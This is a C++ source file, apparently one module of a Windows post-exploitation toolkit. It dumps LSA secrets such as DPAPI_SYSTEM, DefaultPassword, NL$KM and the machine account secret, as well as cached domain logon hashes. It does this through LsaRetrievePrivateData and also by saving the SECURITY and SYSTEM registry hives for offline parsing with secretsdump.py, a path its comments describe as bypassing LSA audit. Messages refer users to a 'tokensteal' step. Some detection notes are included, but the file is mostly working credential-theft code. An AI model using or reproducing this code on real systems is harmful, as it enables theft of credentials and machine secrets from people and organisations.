#include "LSASecrets.h"
#include <ntsecapi.h>
#pragma comment(lib, "advapi32.lib")

// ── Enable SeBackupPrivilege + SeSecurityPrivilege ────────────────────────────

static bool EnablePriv(const char* privName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken))
        return false;
    TOKEN_PRIVILEGES tp = {};
    LookupPrivilegeValueA(NULL, privName, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return GetLastError() == ERROR_SUCCESS;
}

static std::string HexDump(const BYTE* data, DWORD len, DWORD maxBytes = 64) {
    std::string r;
    char buf[6];
    for (DWORD i = 0; i < min(len, maxBytes); i++) {
        snprintf(buf, sizeof(buf), "%02X ", data[i]);
        r += buf;
        if ((i+1) % 16 == 0) r += "\n    ";
    }
    if (len > maxBytes) r += "... (" + std::to_string(len) + " bytes total)";
    return r;
}

// ── Via LsaOpenPolicy + LsaRetrievePrivateData ────────────────────────────────

std::string LSASecrets::DumpViaAPI() {
    EnablePriv(SE_TCB_NAME);         // "SeTcbPrivilege"
    EnablePriv(SE_SECURITY_NAME);    // "SeSecurityPrivilege"

    LSA_OBJECT_ATTRIBUTES oa = {};
    HANDLE hLsa = NULL;
    NTSTATUS st = LsaOpenPolicy(NULL, &oa,
                                POLICY_GET_PRIVATE_INFORMATION | POLICY_VIEW_LOCAL_INFORMATION,
                                &hLsa);
    if (st != STATUS_SUCCESS)
        return "LSASecrets: LsaOpenPolicy failed status=0x" +
               [&](){ char b[16]; snprintf(b,sizeof(b),"%08X",(DWORD)st); return std::string(b); }() +
               " (need SYSTEM token — run tokensteal first)";

    static const std::vector<std::wstring> secrets = {
        SW(L"DPAPI_SYSTEM"),
        SW(L"DefaultPassword"),
        SW(L"NL$KM"),
        SW(L"$MACHINE.ACC"),
    };

    std::string r = "LSA Secrets via LsaRetrievePrivateData:\n";
    r += "(Detection: Security event 4662 for each retrieval)\n\n";

    for (const auto& sec : secrets) {
        LSA_UNICODE_STRING name;
        name.Buffer        = (PWSTR)sec.data();
        name.Length        = (USHORT)(sec.size() * 2);
        name.MaximumLength = name.Length + 2;

        PLSA_UNICODE_STRING out = NULL;
        NTSTATUS st2 = LsaRetrievePrivateData(hLsa, &name, &out);
        char wname[128] = {};
        WideCharToMultiByte(CP_ACP, 0, sec.data(), -1, wname, sizeof(wname)-1, NULL, NULL);
        if (st2 == STATUS_SUCCESS && out) {
            r += "  " + std::string(wname) + " (" + std::to_string(out->Length) + " bytes):\n";
            r += "    " + HexDump((BYTE*)out->Buffer, out->Length) + "\n";
            LsaFreeMemory(out);
        } else {
            r += "  " + std::string(wname) + ": not found or access denied\n";
        }
    }

    // Also enumerate NL$1..NL$10 (cached domain logon hashes)
    r += "\nCached domain logon hashes (NL$1..NL$10):\n";
    for (int i = 1; i <= 10; i++) {
        wchar_t key[16]; swprintf(key, 16, L"NL$%d", i);
        LSA_UNICODE_STRING name;
        name.Buffer = key; name.Length = (USHORT)(wcslen(key)*2); name.MaximumLength = name.Length+2;
        PLSA_UNICODE_STRING out = NULL;
        if (LsaRetrievePrivateData(hLsa, &name, &out) == STATUS_SUCCESS && out) {
            r += "  NL$" + std::to_string(i) + " (" + std::to_string(out->Length) + " bytes):\n";
            r += "    " + HexDump((BYTE*)out->Buffer, out->Length) + "\n";
            LsaFreeMemory(out);
        }
    }

    LsaClose(hLsa);
    return r;
}

// ── Via registry save (bypasses LSA API audit) ────────────────────────────────

std::string LSASecrets::DumpViaRegistry() {
    EnablePriv(SE_BACKUP_NAME);
    EnablePriv(SE_SECURITY_NAME);

    char tmp[MAX_PATH]; GetTempPathA(sizeof(tmp), tmp);
    std::string secFile = std::string(tmp) + "SEC_" + std::to_string(GetTickCount()) + ".tmp";
    std::string sysFile = std::string(tmp) + "SYS_" + std::to_string(GetTickCount()) + ".tmp";

    // Save SECURITY and SYSTEM hives
    HKEY hSec, hSys;
    LONG r1 = RegOpenKeyExA(HKEY_LOCAL_MACHINE, S("SECURITY").c_str(), 0, READ_CONTROL|KEY_READ, &hSec);
    LONG r2 = RegOpenKeyExA(HKEY_LOCAL_MACHINE, S("SYSTEM").c_str(),   0, READ_CONTROL|KEY_READ, &hSys);

    std::string r = "LSASecrets via registry hive save:\n";
    if (r1 != ERROR_SUCCESS)
        return r + "Cannot open HKLM\\SECURITY (err=" + std::to_string(r1) +
               ") — need SYSTEM token.\n"
               "Run: tokensteal  then retry.";

    LONG sr = RegSaveKeyA(hSec, secFile.c_str(), NULL);
    RegCloseKey(hSec);
    if (r2 == ERROR_SUCCESS) { RegSaveKeyA(hSys, sysFile.c_str(), NULL); RegCloseKey(hSys); }

    if (sr == ERROR_SUCCESS) {
        r += "  SECURITY hive saved to: " + secFile + "\n";
        r += "  SYSTEM hive saved to:   " + sysFile + "\n\n";
        r += "  Parse offline with secretsdump.py or similar:\n";
        r += "  secretsdump.py -security " + secFile +
             " -system " + sysFile + " LOCAL\n\n";
        r += "  Detection:\n"
             "  - RegSaveKey on HKLM\\SECURITY = Sysmon EID 13\n"
             "  - File creation of .tmp hive file in %TEMP%\n"
             "  (No Security 4662 event — this bypasses LsaRetrievePrivateData)\n"
             "  MITRE T1003.004";
    } else {
        r += "  RegSaveKey failed (err=" + std::to_string(sr) + ")";
    }
    return r;
}

std::string LSASecrets::ListSecretNames() {
    EnablePriv(SE_SECURITY_NAME);
    LSA_OBJECT_ATTRIBUTES oa = {};
    HANDLE hLsa = NULL;
    if (LsaOpenPolicy(NULL, &oa, POLICY_VIEW_LOCAL_INFORMATION, &hLsa) != STATUS_SUCCESS)
        return "LSASecrets: LsaOpenPolicy failed (need SYSTEM)";

    HKEY hk;
    std::string r = "LSA Secret key names (HKLM\\SECURITY\\Policy\\Secrets):\n";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, S("SECURITY\\Policy\\Secrets").c_str(),
                      0, KEY_ENUMERATE_SUB_KEYS, &hk) != ERROR_SUCCESS) {
        LsaClose(hLsa);
        return r + "  Cannot enumerate (need SYSTEM token)\n";
    }
    char name[256]; int count = 0;
    for (DWORD idx = 0; ; idx++) {
        DWORD len = sizeof(name);
        if (RegEnumKeyExA(hk, idx, name, &len, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
        r += "  " + std::string(name) + "\n";
        count++;
    }
    RegCloseKey(hk); LsaClose(hLsa);
    r += std::to_string(count) + " secret(s) found.\n"
         "(Names only — values require DumpViaAPI or DumpViaRegistry)";
    return r;
}
